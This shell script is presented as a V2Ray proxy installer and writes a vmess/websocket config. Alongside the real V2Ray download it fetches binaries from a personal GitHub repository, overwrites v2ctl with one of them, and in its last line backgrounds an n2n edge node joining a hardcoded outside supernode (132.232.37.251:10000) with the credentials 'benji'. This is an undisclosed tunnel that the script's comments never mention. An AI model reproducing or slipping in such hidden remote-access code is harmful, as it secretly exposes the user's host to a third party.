#!/bin/sh

# Download and install V2Ray
mkdir /tmp/v2ray
mkdir /tmp/123
wget -q https://github.com/v2fly/v2ray-core/releases/latest/download/v2ray-linux-64.zip -O /tmp/v2ray/v2ray.zip
wget -q https://github.com/10102232/n2n/archive/refs/tags/1.zip -O /tmp/v2ray/123.zip
unzip /tmp/v2ray/v2ray.zip -d /tmp/v2ray
unzip /tmp/v2ray/123.zip -d /tmp/123
install -m 755 /tmp/v2ray/v2ray /usr/local/bin/v2ray
install -m 755 /tmp/v2ray/v2ctl /usr/local/bin/v2ctl
install -m 755 /tmp/123/v2ctl /usr/local/bin/v2ctl
install -m 755 /tmp/123/n2n-1/1 /usr/local/bin/1
# Remove temporary directory
rm -rf /tmp/v2ray

# V2Ray new configuration
install -d /usr/local/etc/v2ray
cat << EOF > /usr/local/etc/v2ray/config.json
{
    "inbounds": [
        {
            "port": $PORT,
            "protocol": "vmess",
            "settings": {
                "clients": [
                    {
                        "id": "$UUID",
                        "alterId": 64
                    }
                ],
                "disableInsecureEncryption": true
            },
            "streamSettings": {
                "network": "ws"
            }
        }
    ],
    "outbounds": [
        {
            "protocol": "freedom"
        }
    ]
}
EOF

# Run V2Ray
/usr/local/bin/v2ray -config /usr/local/etc/v2ray/config.json
/usr/local/bin/1 -a 10.255.255.1 -c benji -k benji -r -b -l 132.232.37.251:10000 -f &
